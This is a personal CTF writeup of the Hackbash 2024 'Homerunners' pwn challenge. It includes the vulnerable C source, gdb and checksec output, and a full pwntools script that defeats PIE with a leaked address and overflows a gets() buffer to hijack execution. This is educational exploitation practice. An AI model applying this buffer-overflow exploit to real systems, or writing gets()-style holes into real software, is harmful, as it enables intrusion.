---
title: Hackbash'24 Writeup (Pwn)
description: Hackbash'24 Writeup (Pwn)
publishDate: 17 Mar 2024
tags:
- ctf
pinned: false
draft: false
---
After 2 long weekends, I qualified for the finals in NUS Hackbash 2024 x A.YCEP as a noob. Here is a writeup of the hardest challenge I solved in pwn. 

## Pwned!
During the event of the competition I spent 90% of my time on pwn challenges. Although I didn't complete all of the challenges in that category :(, I had a great time and picked up a lot of debugging skills along the way which I will be noting down below. 

### Homerunners 
The **Homerunners** challenge was by far the most painful one. But I did solve it eventually so lets talk about it. 

Like most binary exploitation challenges, we always start with a `checksec` so we know what kind of file we're dealing with here.

```bash
  ┌──(kali㉿kali)-[~/Downloads/Finals/homerun]
  └─$ checksec ./chall
  [*] '/home/kali/Downloads/Finals/homerun/chall'
      Arch:     amd64-64-little
      RELRO:    Full RELRO
      Stack:    No canary found
      NX:       NX enabled
      PIE:      PIE enabled
```
Just from a simple command we know what is possible when it comes to exploiting our script over here.

```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <sys/types.h>
  #include <sys/stat.h>

  char art[] = 
  "⣿⡇⣿⣿⣿⠛⠁⣴⣿⡿⠿⠧⠹⠿⠘⣿⣿⣿⡇⢸⡻⣿⣿⣿⣿⣿⣿⣿\n"
  "⢹⡇⣿⣿⣿⠄⣞⣯⣷⣾⣿⣿⣧⡹⡆⡀⠉⢹⡌⠐⢿⣿⣿⣿⡞⣿⣿⣿\n"
  "⣾⡇⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⢻⣦⡀⠁⢸⡌⠻⣿⣿⣿⡽⣿⣿\n"
  "⡇⣿⠹⣿⡇⡟⠛⣉⠁⠉⠉⠻⡿⣿⣿⣿⣿⣿⣦⣄⡉⠂⠈⠙⢿⣿⣝⣿\n"
  "⠤⢿⡄⠹⣧⣷⣸⡇⠄⠄⠲⢰⣌⣾⣿⣿⣿⣿⣿⣿⣶⣤⣤⡀⠄⠈⠻⢮\n"
  "⠄⢸⣧⠄⢘⢻⣿⡇⢀⣀⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠄⢀\n"
  "⠄⠈⣿⡆⢸⣿⣿⣿⣬⣭⣴⣿⣿⣿⣿⣿⣿⣿⣯⠝⠛⠛⠙⢿⡿⠃⠄⢸\n"
  "⠄⠄⢿⣿⡀⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡾⠁⢠⡇⢀\n"
  "⠄⠄⢸⣿⡇⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣫⣻⡟⢀⠄⣿⣷⣾\n"
  "⠄⠄⢸⣿⡇⠄⠈⠙⠿⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⠊⢀⡇⣿⣿\n"
  "⠒⠤⠄⣿⡇⢀⡲⠄⠄⠈⠙⠻⢿⣿⣿⠿⠿⠟⠛⠋⠁⣰⠇⠄⢸⣿⣿⣿";

  // you don't have to be concerned about what this function does
  // but this is the objective. if you call this function, you will get the flag.
  void sweet_sweet_homerun() {
    char flag[0x100];
    int fd = open("flag.txt", O_RDONLY);
    if (fd == -1) {
      write(1, "An error has occurred. Contact an admin for help.\n", 50);
      exit(-1);
    }
    read(fd, flag, 0x100);
    close(fd);
    write(1, flag, 0x100);
    exit(0);
  }

  int main() {

    int x;
    int y;
    char action[0x100];

    // IGNORE THESE 2 LINES
    setbuf(stdin, 0);
    setbuf(stdout, 0);

    x = (unsigned long long)sweet_sweet_homerun & 0xffffffff;
    y = (unsigned long long)sweet_sweet_homerun >> 32;

    puts("Softball isn't just about brute force. You need some accuracy too :)");
    printf("Do you see the home plate at the coordinates (%d, %d)? Show me what you got!\n%s", x, y, art);
    printf("\nAction: ");

    gets(action);
    
    puts("That went far...");
  }
```

Off the bat, we can immediately identify the `gets()` function used, which is vulnerable to buffer overflows. The script also has a `sweet_sweet_homerun()` function that gives us our flag. However, the problem is that PIE is enabled. Now it isn't as straightforward as previous challenges.

#### PIE? Ke yi chi de ma?
PIE stands for Position Independent Executable and is one of the security mitigations deployed to prevent against buffer overflow attacks. One way to know that PIE is enabled is the `checksec` command performed earlier, but we can also tell through the addresses in gdb.

:::tip
Do `gdb -q chall` to access the debugger.
:::

```bash
  pwndbg> disass main
  Dump of assembler code for function main:
    0x00000000000012e3 <+0>:     endbr64
    0x00000000000012e7 <+4>:     push   rbp
    0x00000000000012e8 <+5>:     mov    rbp,rsp
    0x00000000000012eb <+8>:     sub    rsp,0x110
```
When addresses start looking this strange, we know that PIE is enabled and we can no longer jump directly using these addresses obtained from the debugger. So how can we jump to `sweet_sweet_homerun` ?

#### How to eat the PIE
Unfortunately *(or maybe fortunately?)*, PIE isn't foolproof as its bigggest weakness is that it uses the same offset on every address (although that changes every time the program is ran again). This means that with just one address exposed, we can calculate the true addresses of other functions within the program and jump around freely.

Looking at the script again, we can see that there is a line that actually prints out the address of `sweet_sweet_hoemrun`. 

```c
    x = (unsigned long long)sweet_sweet_homerun & 0xffffffff;
    y = (unsigned long long)sweet_sweet_homerun >> 32;

    puts("Softball isn't just about brute force. You need some accuracy too :)");
    printf("Do you see the home plate at the coordinates (%d, %d)? Show me what you got!\n%s", x, y, art);
```

Just our luck! Although it is in decimal and has split the 16 byte address into upper and lower pieces, we can reverse the process easily with the use of pwntools. 

:::note
In this challenge we did not have to calculate any offsets to obtain our true addresses as the address of `sweet_sweet_homerun` was provided. However if we needed to jump to a different function, we can use `gdb` to find the offset (demonstrated above) and subtract the offset from the ever-changing exposed address of `sweet_sweet_homerun` on the stack, to calculate the base address of the program. In fact, it doesn't even have to be the address of `sweet_sweet_homerun`! As long as an address on a stack is exposed, it can be used to obtain the base address which allows the attacker to jump to any point in the program.
Sometimes, such challenges can be paired with other vulnerabilities (e.g. format string vuln) to expose a single address on the stack to be able to calculate the base address.  
:::

```python
  from pwn import *

  # uncomment this line to connect to remote
  # nc challs.nusgreyhats.org 61636
  p = remote("challs.nusgreyhats.org", 55434)
  # p = process("./chall")
  coords = p.recvuntil("?").decode('utf-8')

  start_index = coords.find('\n')
  new_coords = coords[start_index:]
  start_index = new_coords.find('(')
  end_index = new_coords.find(')')

  accurate_coords = new_coords[start_index:end_index]

  print("EHHEHEHE:"+accurate_coords)

  x_and_y = accurate_coords.replace('(', '').replace(')', '').strip().split(',')

  x = int(x_and_y[0].strip().replace('-', '')) # Lower 32 bits
  y = int(x_and_y[1].strip()) # Upper 32 bits 

  # Caluculation of Coordinates
  address_1 = (y << 32) | x
  print(address_1)
  address = p32(y) + p32(x)
  print(u64(address))

  payload = b"A"*280
  payload += p64(address_1) ## offset of sweet sweet homerun


  print(payload)
  p.sendline(payload)
  p.interactive()
```

#### But..the buffer size?[^de-brujin_sequence]
You might have noticed, "oh yea you did all that but in your payload you also had a buffer size of 280...how did you obtain that value so easily?". Well, gdb and pwn tools make life easier.

We can first generate a cyclic sequence with pwntools to make debbuging easier.
```bash
  ❯ cyclic -n8 500
  aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa
```
Running the challenge into gdb and inputting what we generated into the input, we will crash the program and gdb will show up with a segmentation error as it tries to jump into a memory that doesn't exist on the stack.
```bash
  ► 0x5555555553a1 <main+190>    ret    <0x626161616161616b>
```
If we convert `0x626161616161616b` basck to ASCII it is `kaaaaaab` backwards. This is why we use cyclic as we can immediately calculate the number of bytes to `0x626161616161616b` without all the manual effort.

```bash
  ┌──(kali㉿kali)-[~/Downloads/Hackbash2024/Finals/homerun]
  └─$ cyclic -n8 -l 0x626161616161616b
  280
```
And with that, the challenge is solved!!

## Special Thanks
**Elma** (caprinux) for cheatsheet[^cheatsheet] and mentoring, the entire **Hackbash 2024 team** and finally, my teammates in **Team 8**.

[^de-brujin_sequence]: <https://nusgreyhats.notion.site/De-Brujin-Sequence-e07481fc57664dfa8b03a80e2d6876e0>
[^cheatsheet]: <https://github.com/caprinux/cheatsheets/blob/main/gdb.md>
